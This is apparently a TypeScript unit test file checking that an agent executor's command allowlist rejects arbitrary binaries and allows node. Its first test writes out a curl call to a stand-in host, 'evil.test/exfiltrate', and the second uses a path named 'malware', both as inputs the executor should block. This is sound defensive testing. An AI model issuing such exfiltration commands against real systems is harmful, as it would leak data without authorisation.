import { describe, test } from "node:test";
import assert from "node:assert/strict";
import { defaultPiExecutor } from "../src/agents/pi.js";

describe("PI executor command allowlist (H6)", () => {
  test("rejects an arbitrary binary command action", async () => {
    const result = await defaultPiExecutor(
      { id: "pi.cmd.evil", kind: "command", command: "curl", args: ["http://evil.test/exfiltrate"] } as never,
      {},
    );
    assert.equal(result.status, "error");
    assert.equal(result.code, "PI_EXECUTOR_COMMAND_NOT_ALLOWED");
  });

  test("rejects a path-prefixed arbitrary binary", async () => {
    const result = await defaultPiExecutor(
      { id: "pi.cmd.evil2", kind: "command", command: "/usr/local/bin/malware", args: [] } as never,
      {},
    );
    assert.equal(result.status, "error");
    assert.equal(result.code, "PI_EXECUTOR_COMMAND_NOT_ALLOWED");
  });

  test("allows a yolo CLI basename (does not actually spawn — no args create harm)", async () => {
    // A bare allowlisted basename passes the gate; we assert only that it is NOT
    // rejected as DISALLOWED (it may fail at spawn for missing args, which is fine).
    const result = await defaultPiExecutor(
      { id: "pi.cmd.yolo-version", kind: "command", command: "node", args: ["--version"] } as never,
      {},
    );
    assert.notEqual(result.code, "PI_EXECUTOR_COMMAND_NOT_ALLOWED");
  });
});
